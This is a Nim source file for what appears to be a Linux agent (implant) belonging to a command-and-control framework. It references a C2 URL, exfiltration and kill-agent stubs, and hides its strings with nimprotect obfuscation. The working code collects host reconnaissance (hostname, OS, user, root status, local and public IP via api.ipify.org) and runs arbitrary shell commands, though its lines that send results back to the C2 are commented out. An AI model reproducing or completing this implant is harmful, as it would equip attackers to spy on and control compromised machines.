include ../config
import std/[strformat, tables, nativesockets, random, json, streams]
import system/[io]
import httpclient
import nimprotect
import strutils
import osproc
import crc32
import os

# Core functions
# proc start(): void
# proc parse_command(command: JsonNode): bool
# proc post_data(command_type: string, data_dict: string): bool
# proc nimbo_main*(): void 

# Command executors
proc collect_data(): bool
proc run_shell_command(shell_command: string): bool
# proc exfil_file(file_path: string): bool
# proc write_file(file_data_base64: string, file_path: string): bool
# proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
# proc kill_agent(): void

# Helpers
# proc get_agent_id(): string
# proc calc_sleep_time(timeframe: int,  jitter_percent: int): int

# Globals
# let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
# let client = newHttpClient(userAgent=get_agent_id())
let client = newHttpClient()


#########################
### Command executors ###
#########################


proc collect_data(): bool =
    var is_success: bool
    var hostname: string
    var os_version: string
    var process: string
    var username: string
    var is_admin: string
    var is_elevated: string
    var ipv4_local: string
    var ipv4_public: string

    try:
        hostname = getHostname()
    except:
        hostname = could_not_retrieve
    try:    
        for i in readFile(protectString("/etc/os-release")).split("\n"):
            if contains(i, protectString("PRETTY_NAME")):
                os_version = i.split("\"")[1]
    except:
        os_version = could_not_retrieve      
    try:    
        var pid = $getCurrentProcessId()
        var pname = readFile(protectString("/proc/") & $pid & protectString("/comm")).replace("\n", "")
        process = pid & " " & pname
    except:
        process = could_not_retrieve
    try:
        username = execCmdEx(protectString("whoami"), options={poDaemon})[0].replace("\n", "")
    except:
        username = could_not_retrieve
    if username == protectString("root"):
        is_admin = "True"
        is_elevated = "True"
    else: 
        is_admin = "False"
        is_elevated = "False"
    try:
        ipv4_local = execCmdEx(protectString("hostname -i"))[0].replace("\n", "")
    except:
        ipv4_local = could_not_retrieve
    try:
        ipv4_public = client.getContent(protectString("http://api.ipify.org"))
    except:
        ipv4_public = could_not_retrieve
    
    var data = {

        protectString("Hostname"): hostname,
        protectString("OS Version"): os_version,
        protectString("Process"): process,
        protectString("Username"): username, 
        protectString("Is Admin"): is_admin, 
        protectString("Is Elevated"): is_elevated, 
        protectString("IPV4 Local"): ipv4_local, 
        protectString("IPV4 Public"): ipv4_public
    
    }.toOrderedTable()
    
    # is_success = post_data(protectString("collect") , $data)

    return is_success


proc run_shell_command(shell_command: string): bool =
    var output: string
    var is_success: bool

    try:
        output = execCmdEx(shell_command, options={poDaemon})[0]
    except:
        output = could_not_retrieve
    
    var data = {
        protectString("shell_command"): shell_command,
        "output": output
    }.toOrderedTable()

    # is_success = post_data(protectString("cmd"), $data)
    echo output
    return is_success


#########################
######## Helpers ########
#########################


##########################
##### Core functions #####
##########################